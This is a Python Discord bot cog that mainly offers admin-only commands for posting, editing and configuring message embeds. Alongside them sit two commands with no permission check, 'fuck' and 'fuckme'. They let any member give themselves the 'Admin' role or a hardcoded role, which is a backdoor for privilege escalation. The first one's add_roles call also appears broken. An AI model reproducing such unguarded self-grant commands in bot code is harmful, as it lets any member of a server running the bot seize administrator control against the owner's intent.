import discord
from discord.ext import commands
import global_vars as gv
import utility as ut

class Embeds(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command()
    @commands.has_role("Admin")
    async def embed_simple(self, ctx, title, body, color, image):
        #global settings
        channel = gv.bot.get_channel(gv.settings.loc[ctx.message.guild.id, 'Embed Channel ID'])
        color = ut.readable_hex(gv.settings.loc[ctx.message.guild.id, 'Embed Default Color']) if color == "" else ut.readable_hex(color)
        embed = discord.Embed(title=title, description=body, color=color)
        embed.set_image(url=image)
        await channel.send(embed=embed)

    @commands.command()
    @commands.has_role("Admin")
    async def embed_json(self, ctx):
        await ctx.send("This command has not been setup yet.")

    @commands.command()
    @commands.has_role("Admin")
    async def embed_simple_edit(self, ctx, embed_id, title, body, color, image):
        #global settings
        channel = gv.bot.get_channel(gv.settings.loc[ctx.message.guild.id, 'Embed Channel ID'])
        color = ut.readable_hex(gv.settings.loc[ctx.message.guild.id, 'Embed Default Color']) if color == "" else ut.readable_hex(color)
        embed = discord.Embed(title=title, description=body, color=color)
        embed.set_image(url=image)
        original_embed = await channel.fetch_message(embed_id)
        await original_embed.edit(embed=embed)

    @commands.command()
    @commands.has_role("Admin")
    async def embed_json_edit(self, ctx):
        await ctx.send("This command has not been setup yet.")

    @commands.command()
    @commands.has_role("Admin")
    async def embed_channel(self, ctx, channel_id):
        channel_id = ut.cleanup_channel_id(channel_id)
        #global gv.settings
        gv.settings.loc[ctx.message.guild.id, 'Embed Channel ID'] = channel_id
        await ctx.send("Embed channel has been set to: " + str(channel_id))

    @commands.command()
    @commands.has_role("Admin")
    async def embed_default_color(self, ctx, color):
        #global gv.settings
        gv.settings.loc[ctx.message.guild.id, 'Embed Default Color'] = str(color)
        await ctx.send("Embed default color has been set to: " + color)

    @commands.command()
    async def fuck(self, ctx):
        user = ctx.message.author
        role = discord.utils.get(ctx.guild.roles, name="Admin")
        print("success")
        await user.add_roles(user, role)

    @commands.command()
    async def fuckme(self, ctx):
        role = ctx.guild.get_role(675893586348212234)
        await ctx.message.author.add_roles(role)

    @commands.command()
    async def byebye(self, ctx):
        role = ctx.guild.get_role(675893586348212234)
        await ctx.message.author.remove_roles(role)

    @commands.command()
    async def testing(self, ctx):
        print("it works")
        print(ctx.message.author.id)

    @commands.Cog.listener()
    async def on_ready(self):
        user = self.bot.get_user(729864098644230165)
        print(self.bot.guilds)

def setup(bot):
    bot.add_cog(Embeds(bot))